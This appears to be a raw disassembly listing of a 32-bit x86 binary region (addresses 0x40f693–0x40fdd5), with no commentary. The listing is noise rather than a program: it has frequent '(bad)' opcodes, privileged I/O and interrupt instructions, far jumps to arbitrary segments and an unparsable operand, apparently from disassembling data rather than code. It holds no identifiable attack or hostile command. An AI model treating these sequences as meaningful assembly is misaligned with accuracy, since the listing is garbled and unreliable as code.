  40f693:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f694:	ins    BYTE PTR es:[edi],dx
  40f695:	push   cs
  40f696:	test   BYTE PTR [esi+eax*8-0x1855742a],dh
  40f69d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f69e:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40f6a0:	jne    0x40f6a6
  40f6a2:	std    
  40f6a3:	add    edx,edi
  40f6a5:	cmp    al,0x9e
  40f6a7:	bound  ecx,QWORD PTR [ebx-0x2349d6a1]
  40f6ad:	fcomp  QWORD PTR [ebx-0x514d1ca0]
  40f6b3:	pop    edi
  40f6b4:	int    0x6c
  40f6b6:	xor    BYTE PTR [eax+0x307606d6],bl
  40f6bc:	outs   dx,BYTE PTR ds:[esi]
  40f6bd:	add    eax,0x2bc521c
  40f6c2:	dec    edi
  40f6c3:	mov    esp,0xfbc5a53e
  40f6c8:	mov    edi,0x72f213b1
  40f6cd:	jmp    0x40f72f
  40f6cf:	and    ch,BYTE PTR [ebp-0x6404ff71]
  40f6d5:	lock mov DWORD PTR ss:[si+0x7e],esi
  40f6db:	push   ds
  40f6dc:	xchg   esp,eax
  40f6dd:	pop    ebx
  40f6de:	das    
  40f6df:	dec    ecx
  40f6e0:	add    esp,0x236966a5
  40f6e6:	sbb    eax,DWORD PTR [ecx+0x16]
  40f6e9:	stos   BYTE PTR es:[edi],al
  40f6ea:	sbb    dh,BYTE PTR [ebx+0x28]
  40f6ed:	pop    edi
  40f6ee:	jb     0x40f726
  40f6f0:	in     eax,dx
  40f6f1:	in     eax,dx
  40f6f2:	int    0x6f
  40f6f4:	and    al,0xf
  40f6f6:	add    BYTE PTR [esi+0xd],bl
  40f6f9:	dec    edx
  40f6fa:	sahf   
  40f6fb:	sbb    dh,BYTE PTR [ebx]
  40f6fd:	xchg   ebx,eax
  40f6fe:	not    DWORD PTR [edx]
  40f700:	call   0x64a62b33
  40f705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f706:	test   esp,edi
  40f708:	retf   0x8c30
  40f70b:	aad    0x5
  40f70d:	jbe    0x40f735
  40f70f:	pop    ebx
  40f710:	or     ebp,DWORD PTR ds:0xb08a9ef5
  40f716:	sub    DWORD PTR [ebx+0x25cc732d],edi
  40f71c:	inc    esp
  40f71d:	scas   al,BYTE PTR es:[edi]
  40f71e:	ficomp WORD PTR ds:0x327e3c35
  40f724:	dec    ebp
  40f725:	inc    edi
  40f726:	adc    eax,0x51cff4b0
  40f72b:	dec    bx
  40f72d:	cmp    eax,0x316e9039
  40f732:	push   0x5b
  40f734:	or     eax,0x1faa0be3
  40f739:	shr    BYTE PTR [esi+0x2c1dec9f],cl
  40f73f:	(bad)  
  40f740:	and    al,0xff
  40f742:	retf   
  40f743:	repz cmp eax,0xbbf132b4
  40f749:	cwde   
  40f74a:	mov    ds:0x653ed308,eax
  40f74f:	je     0x40f6d8
  40f751:	pop    es
  40f752:	aam    0x70
  40f754:	mov    dl,al
  40f756:	adc    BYTE PTR [ebx+0xcba58ee],bl
  40f75c:	fwait
  40f75d:	call   0xfe342073
  40f762:	ret    
  40f763:	jmp    0x40f73d
  40f765:	mov    dl,bl
  40f767:	in     eax,dx
  40f768:	cmp    BYTE PTR [ebx-0x4329cff1],bl
  40f76e:	mov    bl,0xca
  40f770:	add    dh,dh
  40f772:	cdq    
  40f773:	rep outs dx,BYTE PTR ds:[esi]
  40f775:	and    eax,0x21406be5
  40f77a:	pop    ebx
  40f77b:	jae    0x40f7de
  40f77d:	popa   
  40f77e:	stc    
  40f77f:	sbb    BYTE PTR [edi+edi*4-0x1af86485],bh
  40f786:	int    0xb6
  40f788:	ja     0x40f7a4
  40f78a:	xlat   BYTE PTR ds:[ebx]
  40f78b:	aad    0x12
  40f78d:	adc    al,0x6d
  40f78f:	mov    ebp,0xa4e2aee0
  40f794:	mov    esi,0x1d61f4d8
  40f799:	mul    DWORD PTR [ecx+0x6f]
  40f79c:	inc    ebp
  40f79d:	pop    ds
  40f79e:	mov    edi,0xe423d2aa
  40f7a3:	push   es
  40f7a4:	aaa    
  40f7a5:	out    dx,eax
  40f7a6:	jbe    0x40f7e2
  40f7a8:	stos   BYTE PTR es:[edi],al
  40f7a9:	or     eax,0x191d3579
  40f7ae:	loop   0x40f820
  40f7b0:	(bad)  
  40f7b1:	pop    ss
  40f7b2:	inc    esp
  40f7b3:	jg     0x40f7f1
  40f7b5:	mov    ch,0x71
  40f7b7:	push   edx
  40f7b8:	and    BYTE PTR [ecx-0x30],ch
  40f7bb:	les    ebp,FWORD PTR [ecx+0xf]
  40f7be:	(bad)  
  40f7bf:	sbb    DWORD PTR [ebx],ebp
  40f7c1:	(bad)  
  40f7c2:	jmp    0x6f3f7054
  40f7c7:	adc    DWORD PTR [ecx+0x3526331c],edx
  40f7cd:	dec    ecx
  40f7ce:	jl     0x40f7af
  40f7d0:	aas    
  40f7d1:	ins    BYTE PTR es:[edi],dx
  40f7d2:	adc    eax,0x73aac0ec
  40f7d7:	dec    edx
  40f7d8:	sbb    eax,0x32a26462
  40f7dd:	loop   0x40f766
  40f7df:	cld    
  40f7e0:	push   0x21
  40f7e2:	add    BYTE PTR [ebx-0x1bd58ee],0xff
  40f7e9:	sbb    dh,cl
  40f7eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7ec:	jnp    0x40f860
  40f7ee:	into   
  40f7ef:	cli    
  40f7f0:	pop    ebp
  40f7f1:	pop    ebx
  40f7f2:	jbe    0x40f7a5
  40f7f4:	lahf   
  40f7f5:	(bad)  
  40f7f6:	popa   
  40f7f7:	ret    
  40f7f8:	lods   al,BYTE PTR ds:[esi]
  40f7f9:	mov    edx,0xfa44dd24
  40f7fe:	xchg   esp,eax
  40f7ff:	(bad)  
  40f800:	call   0x1646:0xb9ff104e
  40f807:	mov    eax,ds:0x84af019a
  40f80c:	pop    ebx
  40f80d:	fcmovnb st,st(1)
  40f80f:	cmp    DWORD PTR [edi+0x23081119],ebp
  40f815:	add    edx,DWORD PTR [edx+esi*8-0x43]
  40f819:	jmp    0xb529:0xb78c83c
  40f820:	ss jmp 0x40f824
  40f823:	or     BYTE PTR [edx-0x6ea81f4],bh
  40f829:	add    eax,DWORD PTR [ebx+0x276e8564]
  40f82f:	pop    ebp
  40f830:	pop    ebx
  40f831:	add    ah,ch
  40f833:	xchg   edi,eax
  40f834:	dec    ecx
  40f835:	neg    edx
  40f837:	fidiv  DWORD PTR [eax-0x4f9d50f6]
  40f83d:	mov    bh,0x23
  40f83f:	sti    
  40f840:	mov    al,ds:0x47527408
  40f845:	sti    
  40f846:	loop   0x40f886
  40f848:	jo     0x40f873
  40f84a:	js     0x40f84b
  40f84c:	rcl    DWORD PTR [edi-0x6],0x86
  40f850:	sbb    cl,BYTE PTR [eax]
  40f852:	and    DWORD PTR [eax+esi*8-0x42],eax
  40f856:	js     0x40f89a
  40f858:	mov    bl,0xb4
  40f85a:	(bad)  [ebp-0x67]
  40f85d:	stc    
  40f85e:	je     0x40f81b
  40f860:	xor    al,0xae
  40f862:	ds imul ebx,DWORD PTR gs:[esi],0x41
  40f867:	lds    edx,FWORD PTR [ebx+0x58]
  40f86a:	dec    ebx
  40f86b:	mov    ebx,0xcdd8e279
  40f870:	arpl   sp,ax
  40f872:	add    al,0xd3
  40f874:	rol    BYTE PTR [edi+0x42e10420],cl
  40f87a:	or     al,0xfd
  40f87c:	inc    ecx
  40f87d:	mov    esi,0xe4b8021b
  40f882:	fbstp  TBYTE PTR [ecx+esi*8]
  40f885:	mov    bh,0xf7
  40f887:	sbb    esp,0xffffffd3
  40f88a:	mov    al,ds:0x329dd880
  40f88f:	xchg   ebx,eax
  40f890:	iret   
  40f891:	mov    cl,0xed
  40f893:	call   FWORD PTR [ebx-0xd]
  40f896:	aam    0xab
  40f898:	stc    
  40f899:	(bad)  
  40f89a:	fmul   DWORD PTR [ecx]
  40f89c:	sub    edx,DWORD PTR [ecx]
  40f89e:	jle    0x40f8de
  40f8a0:	xor    bh,BYTE PTR [ebp-0x2c]
  40f8a3:	jno    0x40f89f
  40f8a5:	loopne 0x40f83f
  40f8a7:	gs pop ss
  40f8a9:	ins    BYTE PTR es:[edi],dx
  40f8aa:	rcl    BYTE PTR [edi+0x67c696c1],cl
  40f8b0:	call   0x9d4d:0xd6440e31
  40f8b7:	pop    es
  40f8b8:	inc    edi
  40f8b9:	scas   al,BYTE PTR es:[edi]
  40f8ba:	adc    ecx,DWORD PTR [edi-0x3]
  40f8bd:	leave  
  40f8be:	pop    es
  40f8bf:	js     0x40f853
  40f8c1:	daa    
  40f8c2:	in     eax,dx
  40f8c3:	mov    ch,dl
  40f8c5:	cmp    DWORD PTR [ebx],edi
  40f8c7:	test   DWORD PTR [esi+eiz*2],0xf14f0870
  40f8ce:	or     eax,DWORD PTR [ebx]
  40f8d0:	dec    edi
  40f8d1:	iret   
  40f8d2:	into   
  40f8d3:	dec    edi
  40f8d4:	mov    bl,0x72
  40f8d6:	jle    0x40f886
  40f8d8:	push   esp
  40f8d9:	mov    ds:0xa346fe7f,eax
  40f8de:	push   esi
  40f8df:	fmul   QWORD PTR [edi-0x7495ba91]
  40f8e5:	(bad)  
  40f8e6:	into   
  40f8e7:	aad    0xe6
  40f8e9:	jne    0x40f955
  40f8eb:	or     esi,DWORD PTR [ebx+0x42]
  40f8ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8ef:	jecxz  0x40f8d9
  40f8f1:	mov    ds:0x455278bc,eax
  40f8f6:	inc    esp
  40f8f7:	mov    dl,0xe9
  40f8f9:	or     DWORD PTR [edi+0x5a],edx
  40f8fc:	jo     0x40f88d
  40f8fe:	aaa    
  40f8ff:	test   eax,0x8fb31c7e
  40f904:	xchg   DWORD PTR [esi],edx
  40f906:	lds    eax,FWORD PTR [esi+0xe]
  40f909:	pop    ecx
  40f90a:	and    al,0x3e
  40f90c:	into   
  40f90d:	in     eax,dx
  40f90e:	fprem1 
  40f910:	ds (bad) 
  40f912:	(bad)  
  40f914:	jg     0x40f915
  40f916:	adc    eax,0xe317e302
  40f91b:	mov    al,ds:0x46622f0b
  40f920:	popf   
  40f921:	jne    0x40f8d4
  40f923:	in     al,0xb0
  40f925:	xchg   DWORD PTR [edi-0x57d1623c],edi
  40f92b:	sub    BYTE PTR [edx+0x5d07c70f],dl
  40f931:	mov    bh,0x86
  40f933:	ins    DWORD PTR es:[edi],dx
  40f934:	stos   BYTE PTR es:[edi],al
  40f935:	sbb    eax,DWORD PTR [esi]
  40f937:	popa   
  40f938:	fucomi st,st(3)
  40f93a:	fbld   TBYTE PTR [esi+eiz*1+0x5c6a73e4]
  40f941:	xchg   esi,eax
  40f942:	dec    esi
  40f943:	stc    
  40f944:	repz xchg ecx,eax
  40f946:	fmul   QWORD PTR [edi+esi*1+0x2cb0d087]
  40f94d:	stc    
  40f94e:	scas   eax,DWORD PTR es:[edi]
  40f94f:	fnstsw WORD PTR [edx-0x948cd5e]
  40f955:	and    bl,cl
  40f957:	stc    
  40f958:	cmp    dh,BYTE PTR [ecx]
  40f95a:	imul   esp,DWORD PTR [edx+0x1860e914],0x67b35d0c
  40f964:	cmp    bl,BYTE PTR es:0xea1aa345
  40f96b:	rol    DWORD PTR ds:0xb6031d07,cl
  40f971:	je     0x40f98c
  40f973:	neg    DWORD PTR [ebx]
  40f975:	(bad)  
  40f976:	mul    BYTE PTR [ebx+0x4f0388a8]
  40f97c:	inc    edi
  40f97d:	mov    ds:0x6bec0129,al
  40f982:	mov    al,0x3d
  40f984:	les    eax,FWORD PTR ds:0xb59ac33
  40f98a:	dec    edi
  40f98b:	cmp    al,0xdd
  40f98d:	(bad)  [esi]
  40f98f:	dec    eax
  40f990:	rol    BYTE PTR es:[edi-0x153b16f0],0x19
  40f998:	push   ebx
  40f999:	hlt    
  40f99a:	out    dx,eax
  40f99b:	test   eax,0x5e1d96bc
  40f9a0:	push   ds
  40f9a1:	fisttp WORD PTR [ecx-0x1e]
  40f9a4:	jo     0x40f96f
  40f9a6:	data16 xlat BYTE PTR ds:[ebx]
  40f9a8:	mov    ds:0x31566b7e,al
  40f9ad:	enter  0xef7b,0x4e
  40f9b1:	push   edi
  40f9b2:	dec    esp
  40f9b3:	mov    dl,0x8a
  40f9b5:	inc    edx
  40f9b6:	call   0x7da4a9fa
  40f9bb:	mov    ds:0x27af96d2,al
  40f9c0:	adc    ch,BYTE PTR [edi]
  40f9c2:	mov    edx,0xf35a4b8a
  40f9c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9c8:	call   0xe5e2d56a
  40f9cd:	fdivr  QWORD PTR [esp+ecx*8+0x49]
  40f9d1:	pusha  
  40f9d2:	(bad)  
  40f9d3:	mov    al,0x9
  40f9d5:	xchg   ebp,eax
  40f9d6:	or     bl,0xfd
  40f9d9:	sub    eax,edi
  40f9db:	cmc    
  40f9dc:	inc    esp
  40f9dd:	jne    0x40fa2f
  40f9df:	dec    ebx
  40f9e0:	cmp    DWORD PTR [eax+0x48318c47],eax
  40f9e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9e7:	xor    BYTE PTR [eax+0x21],dh
  40f9ea:	xchg   edx,eax
  40f9eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9ec:	push   eax
  40f9ed:	mov    ecx,0xa509d7b3
  40f9f3:	scas   eax,DWORD PTR es:[edi]
  40f9f4:	fisub  WORD PTR [edx]
  40f9f6:	or     al,BYTE PTR [ebp+0x56]
  40f9f9:	push   0xffffffbe
  40f9fb:	pop    ss
  40f9fc:	ror    cl,cl
  40f9fe:	ins    DWORD PTR es:[edi],dx
  40f9ff:	add    esi,DWORD PTR ds:0x5e431e20
  40fa05:	dec    edx
  40fa06:	pop    es
  40fa07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa08:	pop    ds
  40fa09:	inc    ebx
  40fa0a:	fisttp DWORD PTR [ebp+0x37779e43]
  40fa10:	fild   DWORD PTR [edi+0x53]
  40fa13:	fstp   DWORD PTR [edi]
  40fa15:	les    edi,FWORD PTR [ecx-0x60]
  40fa18:	mov    DWORD PTR [eax-0x77],esi
  40fa1b:	mov    ecx,0x4f085f7d
  40fa20:	(bad)  
  40fa21:	sti    
  40fa22:	jecxz  0x40fa2f
  40fa24:	pop    edx
  40fa25:	adc    esp,ebp
  40fa27:	jns    0x40fa52
  40fa29:	outs   dx,BYTE PTR ds:[esi]
  40fa2a:	mov    eax,ds:0xde4fb3c2
  40fa2f:	es test ch,dh
  40fa32:	jg     0x40fa27
  40fa34:	mov    ds:0xa510629f,eax
  40fa39:	xchg   edi,eax
  40fa3a:	jmp    0xd37aaa3b
  40fa3f:	xor    ebp,esi
  40fa41:	(bad)  
  40fa42:	and    BYTE PTR [ecx-0x68],ah
  40fa45:	add    eax,ebp
  40fa47:	test   BYTE PTR [edi+0x24],ch
  40fa4a:	and    cl,BYTE PTR [eax]
  40fa4c:	mov    bl,BYTE PTR [esi]
  40fa4e:	adc    ebx,esi
  40fa50:	(bad)  
  40fa52:	ret    0x7ef4
  40fa55:	daa    
  40fa56:	push   edx
  40fa57:	jle    0x40fa18
  40fa59:	repnz dec esi
  40fa5b:	(bad)  
  40fa5d:	es pop ds
  40fa5f:	int    0x24
  40fa61:	mov    WORD PTR [edx-0x7e889832],es
  40fa67:	sub    BYTE PTR [ebx],dl
  40fa69:	push   edi
  40fa6a:	push   edi
  40fa6b:	sub    al,0x6c
  40fa6d:	test   eax,0x8779a224
  40fa72:	in     eax,0xa4
  40fa74:	jae    0x40fa25
  40fa76:	cmp    bh,BYTE PTR [ebp-0x7fb8c198]
  40fa7c:	rcr    DWORD PTR [esp+ecx*4+0x363fa568],1
  40fa83:	test   BYTE PTR [esi+eax*8],al
  40fa86:	lock addr16 push cs
  40fa89:	add    al,BYTE PTR [ebp+edi*2-0x3997453]
  40fa90:	adc    DWORD PTR [esi],eax
  40fa92:	je     0x40faa1
  40fa94:	scas   al,BYTE PTR es:[edi]
  40fa95:	adc    al,BYTE PTR [edx]
  40fa97:	retf   
  40fa98:	cmp    ebp,DWORD PTR [ebp-0x38ba3555]
  40fa9e:	sbb    BYTE PTR [ebp-0x602ee881],al
  40faa4:	(bad)  
  40faa5:	mov    bl,BYTE PTR [edi]
  40faa7:	add    bl,dh
  40faa9:	sbb    ch,BYTE PTR [edx+0x18]
  40faac:	xor    BYTE PTR [edx+ecx*8+0x65f059e],dh
  40fab3:	jecxz  0x40fa5d
  40fab5:	sub    eax,DWORD PTR [edx]
  40fab7:	pop    ss
  40fab8:	push   eax
  40fab9:	mov    dl,BYTE PTR ds:0xc16acaaa
  40fabf:	push   esi
  40fac0:	and    eax,0xe19c086c
  40fac5:	popf   
  40fac6:	xchg   edi,eax
  40fac7:	add    BYTE PTR [esi],cl
  40fac9:	retf   0x76c2
  40facc:	mov    ch,0x86
  40face:	push   ebp
  40facf:	cwde   
  40fad0:	xchg   ebx,eax
  40fad1:	add    ebp,DWORD PTR [edi-0x18]
  40fad4:	pop    ebx
  40fad5:	mov    al,ch
  40fad7:	xchg   ecx,eax
  40fad8:	shl    DWORD PTR [ecx],cl
  40fada:	fmul   st,st(0)
  40fadc:	ins    DWORD PTR es:[edi],dx
  40fadd:	sub    DWORD PTR [ebp-0x56],esp
  40fae0:	xchg   esp,eax
  40fae1:	test   al,0x77
  40fae3:	pop    esi
  40fae4:	push   esp
  40fae5:	aad    0x6e
  40fae7:	pop    esi
  40fae8:	daa    
  40fae9:	or     eax,0xb6febbb2
  40faee:	push   0x24
  40faf0:	xchg   ecx,eax
  40faf1:	int3   
  40faf2:	test   al,0x4d
  40faf4:	sub    edi,edi
  40faf6:	and    bl,dl
  40faf8:	(bad)  
  40faf9:	call   0xbe160006
  40fafe:	add    DWORD PTR [eax],ebp
  40fb00:	or     dh,0x4c
  40fb03:	(bad)  
  40fb05:	push   cs
  40fb06:	inc    edx
  40fb07:	mov    ecx,0xbd18b88d
  40fb0c:	scas   eax,DWORD PTR es:[edi]
  40fb0d:	xor    dh,BYTE PTR [eax+eiz*2]
  40fb10:	in     eax,0x12
  40fb12:	(bad)  
  40fb13:	loope  0x40faf4
  40fb15:	cmp    al,0xfd
  40fb17:	inc    ecx
  40fb18:	adc    bl,BYTE PTR [ecx+0x5e]
  40fb1b:	jbe    0x40fb2a
  40fb1d:	add    al,0xc0
  40fb1f:	cmp    edi,edx
  40fb21:	std    
  40fb22:	pop    ebx
  40fb23:	push   edx
  40fb24:	enter  0x4bfc,0x62
  40fb28:	and    al,0x98
  40fb2a:	dec    ecx
  40fb2b:	sbb    eax,0x59173d7a
  40fb30:	xor    ebx,ecx
  40fb32:	and    ebx,DWORD PTR [ebp-0x60]
  40fb35:	adc    esp,DWORD PTR [ebx]
  40fb37:	xor    eax,edx
  40fb39:	sub    ch,BYTE PTR [ebx]
  40fb3b:	jle    0x40fbb2
  40fb3d:	leave  
  40fb3e:	and    dl,BYTE PTR [eax+ecx*8]
  40fb41:	sbb    BYTE PTR [ecx+0x44d3f81f],dl
  40fb47:	repz lock cmp al,0x7c
  40fb4b:	nop
  40fb4c:	lea    eax,[ebx+edi*2+0x2e]
  40fb50:	inc    edi
  40fb51:	pusha  
  40fb52:	add    DWORD PTR [esi],ecx
  40fb54:	js     0x40fb32
  40fb56:	mov    WORD PTR [ebx+edi*8+0x25],fs
  40fb5a:	jle    0x40fadc
  40fb5c:	dec    ecx
  40fb5d:	jle    0x40fb66
  40fb5f:	or     ebx,DWORD PTR [ebx-0x66cc4f60]
  40fb65:	aam    0x82
  40fb67:	pushf  
  40fb68:	bound  edx,QWORD PTR [edx-0x44]
  40fb6b:	inc    esp
  40fb6c:	fwait
  40fb6d:	xor    al,dh
  40fb6f:	push   ecx
  40fb70:	int3   
  40fb71:	scas   al,BYTE PTR es:[edi]
  40fb72:	call   0xc49f:0x755d717a
  40fb79:	gs (bad) 
  40fb7b:	mul    BYTE PTR [ebp-0x60]
  40fb7e:	adc    ch,ch
  40fb80:	pop    esi
  40fb81:	std    
  40fb82:	stos   BYTE PTR es:[edi],al
  40fb83:	xlat   BYTE PTR ds:[ebx]
  40fb84:	add    ecx,DWORD PTR [esi+0x7a42bdfd]
  40fb8a:	inc    edx
  40fb8b:	adc    al,0xda
  40fb8d:	sub    eax,0x6fd2986b
  40fb92:	xchg   ebp,eax
  40fb93:	mov    cl,0xbc
  40fb95:	test   BYTE PTR fs:[esi-0x412f9272],al
  40fb9c:	out    dx,al
  40fb9d:	(bad)  
  40fb9e:	outs   dx,DWORD PTR ds:[esi]
  40fb9f:	je     0x40fb65
  40fba1:	out    0xb2,eax
  40fba3:	push   esi
  40fba4:	mov    bh,BYTE PTR es:[ecx+0x32417844]
  40fbab:	repz dec ecx
  40fbad:	jecxz  0x40fb81
  40fbaf:	or     bl,ch
  40fbb1:	popa   
  40fbb2:	sar    BYTE PTR [edx],0x85
  40fbb5:	jb     0x40fb78
  40fbb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbb8:	call   0x86d2:0x50ffe50c
  40fbbf:	xchg   ebx,eax
  40fbc0:	or     eax,0x435390ee
  40fbc5:	jge    0x40fb96
  40fbc7:	mov    edi,0xa94bc634
  40fbcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbcd:	fsub   DWORD PTR [ebx+0x48]
  40fbd0:	scas   eax,DWORD PTR es:[edi]
  40fbd1:	add    BYTE PTR [esi],cl
  40fbd3:	pop    ds
  40fbd4:	xchg   bl,ch
  40fbd6:	mov    edx,0xfdc0deb4
  40fbdb:	retf   
  40fbdc:	lock or al,0x65
  40fbdf:	pop    edx
  40fbe0:	lds    edi,FWORD PTR [ebx+ecx*4-0x576c433b]
  40fbe7:	sub    al,0xa
  40fbe9:	je     0x40fc4b
  40fbeb:	repnz mov ebp,0x62a20ca2
  40fbf1:	add    BYTE PTR [ebx-0x77],0x28
  40fbf5:	adc    eax,0x8ac5f7f9
  40fbfa:	or     DWORD PTR [ecx-0x45],0xffffff9c
  40fbfe:	push   esi
  40fbff:	mov    dl,0x6d
  40fc01:	inc    eax
  40fc02:	mov    ?,ebx
  40fc04:	pop    esi
  40fc05:	retf   
  40fc06:	pop    ss
  40fc07:	mov    cl,0x9d
  40fc09:	repnz icebp 
  40fc0b:	test   BYTE PTR [ebp+0xfd0c994],dh
  40fc11:	adc    eax,0xee8cec3f
  40fc16:	lods   eax,DWORD PTR ds:[esi]
  40fc17:	fld    st(3)
  40fc19:	popf   
  40fc1a:	mov    bh,0xa1
  40fc1c:	cli    
  40fc1d:	daa    
  40fc1e:	sbb    bh,BYTE PTR [ebx]
  40fc20:	add    eax,0xa29663fa
  40fc25:	pop    esp
  40fc26:	and    al,0x5
  40fc28:	cwde   
  40fc29:	rcl    BYTE PTR [esi],cl
  40fc2b:	fist   DWORD PTR [ebp+0x47]
  40fc2e:	jl     0x40fc0e
  40fc30:	data16 (bad) 
  40fc32:	in     al,0x61
  40fc34:	lds    ebx,FWORD PTR [edx]
  40fc36:	lea    edi,[esi-0x929ec0b]
  40fc3c:	xor    BYTE PTR [ecx],dl
  40fc3e:	aad    0xc7
  40fc40:	cmp    BYTE PTR [ebp-0x60],al
  40fc43:	stc    
  40fc44:	xchg   edi,eax
  40fc45:	sub    eax,0xb24844f6
  40fc4a:	iret   
  40fc4b:	dec    dx
  40fc4d:	lea    edx,[ecx-0x30]
  40fc50:	inc    eax
  40fc51:	js     0x40fcc8
  40fc53:	ret    0x19da
  40fc56:	adc    edi,DWORD PTR [edx]
  40fc58:	imul   edx,DWORD PTR [ecx-0x50],0x9670a54d
  40fc5f:	(bad)  
  40fc60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc61:	fwait
  40fc62:	inc    ecx
  40fc63:	aas    
  40fc64:	inc    eax
  40fc65:	(bad)  
  40fc66:	hlt    
  40fc67:	jbe    0x40fc2a
  40fc69:	fsubr  st(1),st
  40fc6b:	lods   al,BYTE PTR ds:[esi]
  40fc6c:	cwde   
  40fc6d:	fimul  WORD PTR gs:[esp+eiz*8]
  40fc71:	aad    0xb4
  40fc73:	stos   DWORD PTR es:[edi],eax
  40fc74:	cmp    al,0x26
  40fc76:	test   eax,0xca39e07a
  40fc7b:	push   ds
  40fc7c:	fs pushf 
  40fc7e:	shl    ebp,0x9d
  40fc81:	popf   
  40fc82:	sar    BYTE PTR [ecx+0x35],0xba
  40fc86:	cmp    DWORD PTR [edx+0x24],ebp
  40fc89:	es imul edx,esi,0x710b4ad3
  40fc90:	jo     0x40fcaa
  40fc92:	xchg   edx,eax
  40fc93:	out    0x60,al
  40fc95:	cmp    al,BYTE PTR [ebx]
  40fc97:	pop    esp
  40fc98:	cwde   
  40fc99:	(bad)  
  40fc9a:	inc    ebp
  40fc9b:	dec    edi
  40fc9c:	fldenv ds:0x1fbdde97
  40fca2:	and    ecx,DWORD PTR [eiz*8+0x1ce09aa]
  40fca9:	popa   
  40fcaa:	adc    DWORD PTR [esi-0x67f56ffa],ecx
  40fcb0:	aaa    
  40fcb1:	and    ebx,DWORD PTR [edi+0x2a]
  40fcb4:	(bad)  
  40fcb5:	aad    0xe4
  40fcb7:	dec    ebp
  40fcb8:	hlt    
  40fcb9:	test   al,0x95
  40fcbb:	bound  esi,QWORD PTR [ebx+0x45deb63d]
  40fcc1:	mov    ah,0x35
  40fcc3:	and    eax,DWORD PTR [ebx]
  40fcc5:	xchg   edx,eax
  40fcc6:	pop    ecx
  40fcc7:	(bad)  
  40fcc8:	test   al,0x36
  40fcca:	xchg   BYTE PTR [esi+0x20290ebd],al
  40fcd0:	test   eax,0x57b2e8c4
  40fcd5:	imul   ebx,DWORD PTR [ecx-0xe44479c],0x4d60bccd
  40fcdf:	push   0x17792e0f
  40fce4:	sbb    ch,BYTE PTR [ebx]
  40fce6:	inc    ebx
  40fce7:	jmp    0x40fd32
  40fce9:	movntps XMMWORD PTR [ecx+0x54],xmm7
  40fced:	jbe    0x40fc8c
  40fcef:	inc    ebx
  40fcf0:	and    edi,ebx
  40fcf2:	clc    
  40fcf3:	not    edx
  40fcf5:	imul   ebx,DWORD PTR [esi-0x61],0x54bc4ff3
  40fcfc:	fist   DWORD PTR [ebp+0x774c293a]
  40fd02:	dec    edi
  40fd03:	jl     0x40fd3e
  40fd05:	loopne 0x40fcfd
  40fd07:	jbe    0x40fcb4
  40fd09:	jl     0x40fd5b
  40fd0b:	mov    bh,0x2
  40fd0d:	push   ds
  40fd0e:	imul   edx,eax,0x70
  40fd11:	pushf  
  40fd12:	xchg   edx,eax
  40fd13:	lock loop 0x40fd0c
  40fd16:	(bad)  
  40fd17:	cdq    
  40fd18:	mov    esp,0xa433a10
  40fd1d:	imul   esp
  40fd1f:	xchg   edx,eax
  40fd20:	lds    edi,FWORD PTR cs:[ebp-0x70]
  40fd24:	add    BYTE PTR [edi+0x4596e68b],bl
  40fd2a:	cwde   
  40fd2b:	push   ecx
  40fd2c:	or     BYTE PTR [ecx-0x4980784d],ah
  40fd32:	cmp    BYTE PTR [eax+0x4cc0d1ee],0x4f
  40fd39:	call   0x8e28:0x83950b25
  40fd40:	jmp    0x201b:0x626ba3cf
  40fd47:	(bad)  
  40fd48:	out    dx,al
  40fd49:	frstor [ebx-0x40]
  40fd4c:	bound  ecx,QWORD PTR [ecx+0x2a]
  40fd4f:	repnz mov ah,BYTE PTR [edx-0x18]
  40fd53:	lods   al,BYTE PTR ds:[esi]
  40fd54:	(bad)  
  40fd55:	nop
  40fd56:	sbb    eax,0xb5c7aa5
  40fd5b:	and    esi,ecx
  40fd5d:	retf   
  40fd5e:	fisttp DWORD PTR [eax+0x62]
  40fd61:	adc    al,0x2f
  40fd63:	das    
  40fd64:	dec    ebp
  40fd65:	sub    ch,BYTE PTR [edi]
  40fd67:	fldenv [eax]
  40fd69:	loopne 0x40fd6c
  40fd6b:	cmp    al,0x11
  40fd6d:	ins    DWORD PTR es:[edi],dx
  40fd6e:	je     0x40fdeb
  40fd70:	sti    
  40fd71:	and    BYTE PTR [ebp+0x2e],ch
  40fd74:	dec    ecx
  40fd75:	cld    
  40fd76:	jmp    0x76aa7294
  40fd7b:	in     eax,0xb2
  40fd7d:	ror    eax,cl
  40fd7f:	aad    0x5b
  40fd81:	xor    al,BYTE PTR [ebp-0x45d4762e]
  40fd87:	and    dh,BYTE PTR [esp+edi*4-0x5d45e5ed]
  40fd8e:	int3   
  40fd8f:	fnstcw WORD PTR [ebx+ebx*2-0x4b]
  40fd93:	jecxz  0x40fd1f
  40fd95:	arpl   WORD PTR [di+0x5e35],ax
  40fd9a:	lea    edi,[ecx]
  40fd9c:	mov    edi,0xcc9f7ee2
  40fda1:	mov    esi,0x4057f9c
  40fda6:	push   ecx
  40fda7:	cmp    esi,DWORD PTR [edx+edx*1-0x71]
  40fdab:	fcmove st,st(3)
  40fdad:	jno    0x40fd7a
  40fdaf:	jmp    FWORD PTR [eax]
  40fdb1:	sbb    eax,0x3b1a6654
  40fdb6:	pop    ecx
  40fdb7:	inc    esi
  40fdb8:	out    0x2c,al
  40fdba:	(bad)  
  40fdbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fdbc:	cdq    
  40fdbd:	cli    
  40fdbe:	jno    0x40fe25
  40fdc0:	arpl   WORD PTR [ebx-0x24da150],bp
  40fdc6:	lock adc BYTE PTR [edx+0x28],0x70
  40fdcb:	adc    edi,DWORD PTR [esi+0x0]
  40fdce:	cmp    BYTE PTR [edx+edi*4+0x36],bh
  40fdd2:	xchg   ebp,eax
  40fdd3:	jo     0x40fdd9
  40fdd5:	jae    0x40fd73
